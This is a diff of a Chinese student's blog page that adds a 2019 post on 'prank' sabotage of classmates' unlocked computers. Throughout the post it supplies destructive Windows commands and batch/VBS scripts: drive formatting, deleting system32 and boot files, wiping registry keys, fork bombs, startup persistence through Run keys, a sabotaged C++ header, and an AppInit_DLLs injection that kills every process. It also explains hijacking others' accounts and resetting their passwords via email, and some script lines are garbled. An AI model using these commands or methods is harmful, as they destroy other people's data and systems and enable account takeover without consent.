@@ -636,6 +636,270 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://code004.ml/posts-2019/how-to-jfca/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="code004">
+      <meta itemprop="description" content="一个OIer的学校生活与OI竞赛记录">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="code004的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/posts-2019/how-to-jfca/" class="post-title-link" itemprop="url">如何正确地进行机房惨案</a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+
+          
+          
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-07-21 21:32:06 / 修改时间：23:17:52" itemprop="dateCreated datePublished" datetime="2019-07-21T21:32:06+08:00">2019-07-21</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>当你的同学忘了锁电脑时…</p>
+<p>本文作者不对任何因使用本页代码而造成的悲剧/毒打/报复等负责。任何因以下行为造成的后果均与 本站/本人/版权说明中的原创者 无关。</p>
+<h1 id="版权说明"><a href="#版权说明" class="headerlink" title="版权说明"></a>版权说明</h1><p>本文大部分内容均来自<a href="https://extmool.github.io" target="_blank" rel="noopener">extmool’s Blog</a> &amp; <a href="https://movetoex.github.io" target="_blank" rel="noopener">movetoex’s Blog</a>，博主做了部分修改。</p>
+<h1 id="Windows-指令篇"><a href="#Windows-指令篇" class="headerlink" title="Windows 指令篇"></a>Windows 指令篇</h1><p>此篇命令均在 Windows10 专业工作站版 测试通过，其他系统请自测。</p>
+<h2 id="轻微毒瘤"><a href="#轻微毒瘤" class="headerlink" title="轻微毒瘤"></a>轻微毒瘤</h2><h3 id="关机"><a href="#关机" class="headerlink" title="关机"></a>关机</h3><p>当你的朋友还有东西没有保存的时候，这个命令着实有效……</p>
+<p>（可以在Win+R中输入，也可以在cmd中输入）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shutdown -f -s -t 0</span><br></pre></td></tr></table></figure>
+
+<p>（注释：-f表示强制关机而不提醒，-s表示关机，-t 0表示倒计时0秒）</p>
+<h3 id="干掉explorer"><a href="#干掉explorer" class="headerlink" title="干掉explorer"></a>干掉explorer</h3><p>执行了这个命令后再Win+D效果更佳（Win+D可以使所有窗口最小化）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">taskkill -f -im explorer.exe</span><br></pre></td></tr></table></figure>
+
+<p>或</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntsd -c q -pn explorer.exe</span><br></pre></td></tr></table></figure>
+
+<h2 id="中度毒瘤"><a href="#中度毒瘤" class="headerlink" title="中度毒瘤"></a>中度毒瘤</h2><h3 id="卡死电脑"><a href="#卡死电脑" class="headerlink" title="卡死电脑"></a>卡死电脑</h3><p>extmool的原文中说可以在cmd中输入如下命令导致电脑卡死：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0|%0</span><br></pre></td></tr></table></figure>
+
+<p>解决办法是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">taskkill -f -im cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p>但是这个办法在我的电脑上并不能工作qwq</p>
+<p>如果在你的电脑上可以工作，欢迎在本文末尾处留言~</p>
+<h2 id="重度毒瘤"><a href="#重度毒瘤" class="headerlink" title="重度毒瘤"></a>重度毒瘤</h2><h3 id="格式化"><a href="#格式化" class="headerlink" title="格式化"></a>格式化</h3><p>当你的朋友习惯把东西存到非系统盘的时候……</p>
+<p>注意，此命令只能在带有管理员权限的命令提示符窗口或Powershell中使用！</p>
+<p>PS：如果不想核平解决的话，建议不要尝试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">format D: /u /s</span><br><span class="line">format E: /u /s</span><br><span class="line">format F: /u /s</span><br></pre></td></tr></table></figure>
+
+<p>能通过那些恢复工具找回一部分</p>
+<p>但是如果真的毒瘤的要死，可以帮他弄个37次随机覆写啥的……</p>
+<h3 id="清除分区"><a href="#清除分区" class="headerlink" title="清除分区"></a>清除分区</h3><p>PS：墙裂建议不要尝试qwq</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">diskpart</span><br><span class="line">list disk</span><br><span class="line">select disk 0</span><br><span class="line">list partition</span><br></pre></td></tr></table></figure>
+
+<p>然后随机挑选一个幸运分区进行格式化。</p>
+<p>基本无解</p>
+<h3 id="干掉system32"><a href="#干掉system32" class="headerlink" title="干掉system32"></a>干掉system32</h3><p>这种方式…比格式化死得更惨</p>
+<p><font color="red" size="6">再次安全警告：下面这行代码很可能导致命案的发生，极度不建议使用！！！</font></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del C:\windows\system32\*.dll /f /s /q</span><br></pre></td></tr></table></figure>
+
+<h1 id="Windows-脚本篇"><a href="#Windows-脚本篇" class="headerlink" title="Windows 脚本篇"></a>Windows 脚本篇</h1><p>此篇命令均在 Windows Server 2008 R2 测试通过，其他系统请自测。</p>
+<p>此篇所有命令需要写成 bat 文件运行</p>
+<h2 id="轻微毒瘤-1"><a href="#轻微毒瘤-1" class="headerlink" title="轻微毒瘤"></a>轻微毒瘤</h2><h3 id="蓝屏死机"><a href="#蓝屏死机" class="headerlink" title="蓝屏死机"></a>蓝屏死机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">del %systemdrive%\*.*/f /s /q</span><br><span class="line">shutdown -r -f -t 00</span><br></pre></td></tr></table></figure>
+
+<h3 id="把文件后缀名改成exe"><a href="#把文件后缀名改成exe" class="headerlink" title="把文件后缀名改成exe"></a>把文件后缀名改成exe</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">REN *.DOC *.EXE </span><br><span class="line">REN *.JPEG *.EXE</span><br><span class="line">REN *.LNK *.EXE</span><br><span class="line">REN *.AVI *.EXE</span><br><span class="line">REN *.MPEG *.EXE</span><br><span class="line">REN *.COM *.EXE</span><br><span class="line">REN *.BAT *.EXE</span><br></pre></td></tr></table></figure>
+
+<h2 id="中度毒瘤-1"><a href="#中度毒瘤-1" class="headerlink" title="中度毒瘤"></a>中度毒瘤</h2><h3 id="开机自动卡死"><a href="#开机自动卡死" class="headerlink" title="开机自动卡死"></a>开机自动卡死</h3><h4 id="开机自动打开所有开始菜单中的程序"><a href="#开机自动打开所有开始菜单中的程序" class="headerlink" title="开机自动打开所有开始菜单中的程序"></a>开机自动打开所有开始菜单中的程序</h4><p>打开C:\ProgramData\Microsoft\Windows\Start Menu\Programs，把所有里面的快捷方式丢到里面的“启动”文件夹里</p>
+<h4 id="开机自动打开无限循环窗口"><a href="#开机自动打开无限循环窗口" class="headerlink" title="开机自动打开无限循环窗口"></a>开机自动打开无限循环窗口</h4><p>Step 1. 在上面写到的“启动”文件夹里新建start.cmd</p>
+<p>Step 2. 写入如下内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">taskkill -f -im explorer.exe &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd</span><br></pre></td></tr></table></figure>
+
+<p>（你想写多少个start test.cmd都可以）</p>
+<p>Step 3. 在“启动”文件夹里新建test.cmd</p>
+<p>Step 4. 写入如下内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd &amp;&amp; start test.cmd</span><br></pre></td></tr></table></figure>
+
+<p>（同上，你想写多少个start test.cmd都可以）</p>
+<p>PS：你可以随意修改start.cmd的名称，也可以修改test.cmd的名称，不过如果你修改test，需要把上面代码里的所有test全部改掉</p>
+<p>Step 5. 重启！</p>
+<h3 id="删除system32"><a href="#删除system32" class="headerlink" title="删除system32"></a>删除system32</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del c:\WINDOWS\system32\*.*/q</span><br></pre></td></tr></table></figure>
+
+<h3 id="删除引导，使PC永久崩溃"><a href="#删除引导，使PC永久崩溃" class="headerlink" title="删除引导，使PC永久崩溃"></a>删除引导，使PC永久崩溃</h3><p>哼！我就不让你启动！</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">attrib -r -s -h c:\autoexec.bat</span><br><span class="line">del c:\autoesec.bat</span><br><span class="line">attrib -r -s -h c:\boot.ini</span><br><span class="line">del c:\boot.ini</span><br><span class="line">attrib -r -s -h c:\ntldr</span><br><span class="line">del c:\ntldr</span><br><span class="line">attrib -r -s -h c:\windows\win.ini</span><br><span class="line">del c:\windows\win.ini</span><br></pre></td></tr></table></figure>
+
+<p>PS：可以通过重装系统解决qwq</p>
+<h3 id="删除所有的注册表"><a href="#删除所有的注册表" class="headerlink" title="删除所有的注册表"></a>删除所有的注册表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@ECHO OFF</span><br><span class="line">START reg delete HKCR/.exe</span><br><span class="line">START reg delete HKCR/.dll</span><br><span class="line">START reg delete HKCR/*</span><br></pre></td></tr></table></figure>
+
+<h2 id="重度毒瘤-1"><a href="#重度毒瘤-1" class="headerlink" title="重度毒瘤"></a>重度毒瘤</h2><h3 id="永久禁用网络"><a href="#永久禁用网络" class="headerlink" title="永久禁用网络"></a>永久禁用网络</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo @echo off&gt;c:windowswimn32.bat</span><br><span class="line">echo break off&gt;&gt;c:windowswimn32.bat</span><br><span class="line">echo ipconfig/release_all&gt;&gt;c:windowswimn32.bat</span><br><span class="line">echo end&gt;&gt;c:windowawimn32.bat</span><br><span class="line">reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat</span><br><span class="line">reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn.bat</span><br><span class="line">PAUSE</span><br></pre></td></tr></table></figure>
+
+<h3 id="一直按回车"><a href="#一直按回车" class="headerlink" title="一直按回车"></a>一直按回车</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Set wshShell=wscript.CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">do</span><br><span class="line">wscript.sleep 100</span><br><span class="line">wshshell.sendkeys &quot;~(enter)&quot;</span><br><span class="line">loop</span><br></pre></td></tr></table></figure>
+
+<h3 id="启动电脑后自动关机"><a href="#启动电脑后自动关机" class="headerlink" title="启动电脑后自动关机"></a>启动电脑后自动关机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Astremetflaved8</span><br><span class="line">echo @echo off&gt;c:windowshartlell.bat</span><br><span class="line">echo break off&gt;&gt;c:windowshartlell.bat</span><br><span class="line">echo shutdown -r -t 11 -f&gt;&gt;c:windowshartlell.bat</span><br><span class="line">echo end&gt;&gt;c:windowshartlell.bat</span><br><span class="line">reg add hkey_local_machinesoftwaremicrosoftwindowscurrentsoftversionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f</span><br><span class="line">reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v /t reg_sz /d c:windowshartlell.bat</span><br><span class="line">PAUSE</span><br></pre></td></tr></table></figure>
+
+<h2 id="极度毒瘤！！！"><a href="#极度毒瘤！！！" class="headerlink" title="极度毒瘤！！！"></a>极度毒瘤！！！</h2><h3 id="开启CD刻录机蜂鸣器"><a href="#开启CD刻录机蜂鸣器" class="headerlink" title="开启CD刻录机蜂鸣器"></a>开启CD刻录机蜂鸣器</h3><p><font color="red" size="6">注意，这些命令可能会使您的耳朵崩溃</font></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Set oWMP=CreateObject(&quot;WMPlayer.OCX.7&quot;)</span><br><span class="line">Set colCDROMs=oWMP.cdrromcollection</span><br><span class="line">do</span><br><span class="line">if colCDROMs.Count &gt;=1 then</span><br><span class="line">For i=0 to colCDROMs.Count -1</span><br><span class="line">colCDROMs.Item(i).Eject</span><br><span class="line">Next</span><br><span class="line">For i=0 to colCDROMs.Count -1</span><br><span class="line">colCDROMs.Item(i).Eject</span><br><span class="line">Next</span><br><span class="line">End if</span><br><span class="line">wscript.sleep 100</span><br><span class="line">loop</span><br></pre></td></tr></table></figure>
+
+<h1 id="Linux-指令篇"><a href="#Linux-指令篇" class="headerlink" title="Linux 指令篇"></a>Linux 指令篇</h1><p>由于不太常用，所以就不写过来了，直接贴地址：<a href="https://extmool.github.io/posts/如何正确地机惨-Linux指令篇/" target="_blank" rel="noopener">这里</a></p>
+<h1 id="账号篇"><a href="#账号篇" class="headerlink" title="账号篇"></a>账号篇</h1><p>最常见的机惨手段，使用他人未锁定的账号进行以下操作：</p>
+<ol>
+<li>发布如“我最强了”/“我tql”/“I AK IOI”</li>
+<li>在QQ/TIM中一个会话右键，打开好友管理器，全选好友，点击删除按钮。不过目前没有找到一键退群，只能一个一个退了qwq</li>
+<li>在某些网站中，可以不用输入原始密码就修改密码，不用我说了</li>
+<li>如果他打开了QQ/TIM，或者他有邮箱，你就可以登录他的QQ邮箱（或者他的其它未锁定/退出的邮箱），然后大肆地瞎改他的密码。毕竟大部分账号都是靠邮箱来进行密码重置的~</li>
+</ol>
+<h1 id="Dev-C-篇"><a href="#Dev-C-篇" class="headerlink" title="Dev-C++篇"></a>Dev-C++篇</h1><p>如果你的同学用的是Dev-C++，就有好戏看了~</p>
+<ol>
+<li>工具-&gt;编译选项，勾选“在编译时加入以下命令”，然后输入–help，他就再也看不到编译结果了</li>
+<li>工具-&gt;编辑器选项-&gt;语法，能调几个调几个，把所有代码标识符都调成和背景色一样</li>
+<li>工具-&gt;环境选项，想改什么改什么，把程序语言改成某些你认不得的语言，把文件关联全取消勾选</li>
+<li>工具-&gt;编译选项-&gt;目录，全删掉</li>
+</ol>
+<h1 id="魔改头文件篇"><a href="#魔改头文件篇" class="headerlink" title="魔改头文件篇"></a>魔改头文件篇</h1><p>说实话…看了这篇你肯定会跃跃欲试的~</p>
+<p>如果他打开了一份代码（或者你“帮”他打开了某一份代码），好戏开始</p>
+<p>在Dev-C++中，你可以通过Ctrl+鼠标左击头文件来打开头文件，然后…</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _IOSTREAM	<span class="comment">// Check if &lt;iostream&gt; is included</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _CSTDILB_  <span class="comment">// &lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _CTIME_  <span class="comment">// &lt;ctime&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctime&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _QUEUE_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// For input &amp; output</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> freopen(file, mode, ptr) freopen(mode, file, ptr)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> cin system(<span class="meta-string">"shutdown /h"</span>); cin</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> cout system(<span class="meta-string">"ping 127.0.0.1 -t"</span>); cout</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> printf(s, ...)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> scanf(s, ...)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// For QRead &amp; QWrite</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> putchar(c)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> getchar() rand() % 10 + <span class="meta-string">'0'</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> isdigit(i) (!(i &gt;= <span class="meta-string">'0'</span> &amp;&amp; i &lt;= <span class="meta-string">'9'</span>))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Others</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> sqrt(a) (a * a * a)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> abs(i) ((i &gt; 0) ? -i : i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> int</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int char</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> system(s)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// For C string operations</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> strlen(s) -1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> strcmp(a, b) 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> strcat(a, b) memset(a, 0, sizeof(a)); memset(b, 0, sizeof(b));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// For keywords</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> <span class="meta-keyword">if</span>(x) srand((unsigned)time(0)); <span class="meta-keyword">if</span> (rand() &lt; 500)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// For STL Containers</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> stack priority_queue</span></span><br></pre></td></tr></table></figure>
+
+<p>（来自MoveToEx的机惨头文件 <a href="https://movetoex.github.io/duliu/Programs/JC-Header.html）" target="_blank" rel="noopener">https://movetoex.github.io/duliu/Programs/JC-Header.html）</a></p>
+<p>把上面这一大堆代码丢到’stdio.h’或’cstdio’里面，把所有东西全部篡改。</p>
+<p>比如如果他代码里出现了’if(x)’（x是某个变量），就会被改成随机数，然后如果随机数小于500qwq</p>
+<p>再比如，’int’会被改成’char’，’cin’会被改成电脑休眠再’cin’，’getchar’会变成随机数字0~9，’cout’会被改成先’ping’一下’localhost’再’cout’…</p>
+<p>也不用字符串了，全部被改了，无论字符串有多长都会返回-1，无论两个字符串有多么不同都会告诉你相同，一旦’strcat’就等于把两个字符串全部’memset’…</p>
+<p><del>真有意思</del></p>
+<p>解决办法：安装或使用VS/VSC，我们有速览定义，不怕~</p>
+<p>当然了，MinGW也是可以按照上面方式来修改的~</p>
+<p>不过很显然，如果被机惨的人备份一遍编译器或者部分主要的头文件，就安全了。而且，实在不行了还可以使用某些在线IDE。</p>
+<h1 id="魔改其他文件篇"><a href="#魔改其他文件篇" class="headerlink" title="魔改其他文件篇"></a>魔改其他文件篇</h1><p>可以删除用户密码，用hexo博客的可以删掉所有文章再deploy一下，或者把别人的博客内容偷偷改一下保存（不deploy），这样没有site update的记录，除非有人一回电脑就git pull，否则一点痕迹也不留。</p>
+<p>还可以把他桌面的快捷方式改一下，全部指向’shutdown -p -f’，再把图标该回去qwq</p>
+<p>然而像我这样的人就可以免除改快捷方式的危害了，我几乎不用桌面的快捷方式，我从来都是用开始菜单的qwq 不过你也可以改开始菜单的啊qwq</p>
+<h1 id="魔改注册表篇"><a href="#魔改注册表篇" class="headerlink" title="魔改注册表篇"></a>魔改注册表篇</h1><p>前面提到过删除所有注册表，不过显然那太容易被发现了qwq</p>
+<p>然而，注册表是个好东西<br>不仅键值目录复杂的让人头疼<br>键值的意义也不好弄清<br>所以注册表可以拿来机惨用，不仅难以确定问题所在，还难以恢复</p>
+<p>比如<br>Windows注册表有一个位置<br>这个位置下指定的DLL会在每一个载入了User32.dll的程序运行的时候载入并调用DllMain传入DLL_PROCESS_ATTACH<br>然后……</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">BOOL WINAPI DllMain(HINSTANCE hInstDll, DWORD fdwReason, PVOID fImpLoad) &#123;</span><br><span class="line">    switch(fdwReason) &#123;</span><br><span class="line">        case DLL_PROCESS_ATTACH: &#123;</span><br><span class="line">            ExitProcess(0);     // 退出进程</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">        default: &#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>至于这个位置在哪……<br>我不想说<br>我™真的不想说<br>不过作为一个乐于机惨别人的人<br>还是分享出来吧<br>‘HEKY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows&#39;<br>这个位置下的’AppInit_DLLs’键的值指定一个或一组DLL的文件名，用’ ‘或’,’分隔。<br>‘LoadAppInit_DLLs’为’1’的时候，’AppInit_DLLs’会被载入。</p>
+<p>在VM试了一遍，确实能用，不过需要编译时指定运行方的Windows平台，否则会提示找不到vcruntime140.dll啥的……<br>然后就是’control’，’cmd’，’taskkill’一类的东西开启的时候都会加载那个链接库<br>酸爽的一批</p>
+<p>倒也有解决方法<br>就是在U盘或者什么地方保存一份注册表的备份，并经常更新</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+<div>
+    
+</div>
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://code004.ml/posts-2019/the-argument-about-an-english-problem/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2117,192 +2381,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://code004.ml/posts-2019/avengers-endgame/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="code004">
-      <meta itemprop="description" content="一个OIer的学校生活与OI竞赛记录">
-      <meta itemprop="image" content="/images/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="code004的博客">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/posts-2019/avengers-endgame/" class="post-title-link" itemprop="url">关于《复仇者联盟4》</a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-
-          
-          
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2019-04-25 22:01:59" itemprop="dateCreated datePublished" datetime="2019-04-25T22:01:59+08:00">2019-04-25</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2019-07-21 20:29:53" itemprop="dateModified" datetime="2019-07-21T20:29:53+08:00">2019-07-21</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/随记/" itemprop="url" rel="index"><span itemprop="name">随记</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
